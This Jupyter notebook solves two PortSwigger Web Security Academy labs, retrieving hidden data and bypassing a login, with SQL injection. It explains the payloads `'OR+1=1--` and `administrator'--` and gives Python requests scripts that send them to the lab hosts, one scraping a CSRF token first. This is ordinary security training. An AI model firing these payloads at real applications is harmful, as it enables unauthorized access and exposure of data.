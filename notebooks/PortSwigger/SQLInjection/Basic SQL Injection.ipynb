{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "6745e26f",
   "metadata": {},
   "source": [
    "https://portswigger.net/web-security/sql-injection"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "070e51ba",
   "metadata": {},
   "source": [
    "# Basic SQL Injection"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4382175d",
   "metadata": {},
   "source": [
    "## Retrieving hidden data\n",
    "https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data\n",
    "\n",
    "In this very basic case we're just using a sql injection to list all categories instead of just one, and to remove any subsequent WHERE logic (i.e. where restricted = 1).\n",
    "\n",
    "The payload in this case is `'OR+1=1--`. The `'` finishes the string, the `OR+1=1` always resolves to TRUE listing evertything in the table and the `--` comments out any subsequent logic."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "f298978e",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "\n",
    "url = \"https://0af100630468e80e81876b910055004b.web-security-academy.net\"\n",
    "payload = \"/filter?category=Gifts'+OR+1=1--\"\n",
    "\n",
    "r = requests.get(url + payload)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "41b80815",
   "metadata": {},
   "source": [
    "## Login Bypass\n",
    "https://portswigger.net/web-security/sql-injection/lab-login-bypass\n",
    "\n",
    "In this case we have some login screen, the username and password for which are passed into a sql query. E.g. `SELECT * FROM users WHERE username = ... AND password = ...`\n",
    "\n",
    "We can use a SQL injection like `administrator'--` to bypass the password check."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 45,
   "id": "8c9a1b49",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "import re\n",
    "\n",
    "url = 'https://0ad5003504bf99ac81c88ed30021009c.web-security-academy.net/login'\n",
    "\n",
    "s = requests.Session()\n",
    "\n",
    "# Start with a get request to get the csrf token\n",
    "r = s.get(url)\n",
    "match = re.search(\n",
    "    'name=\"csrf\" value=\"(.*)\"',\n",
    "    r.text\n",
    ")\n",
    "csrf_token = match.group(1)\n",
    "\n",
    "# Now run the attack\n",
    "payload = {'username' : \"administrator'--\",\n",
    "           'password' : \"arbitrary string\", \n",
    "           'csrf' : csrf_token\n",
    "          }\n",
    "\n",
    "r = s.post(url, data=payload)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.18"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
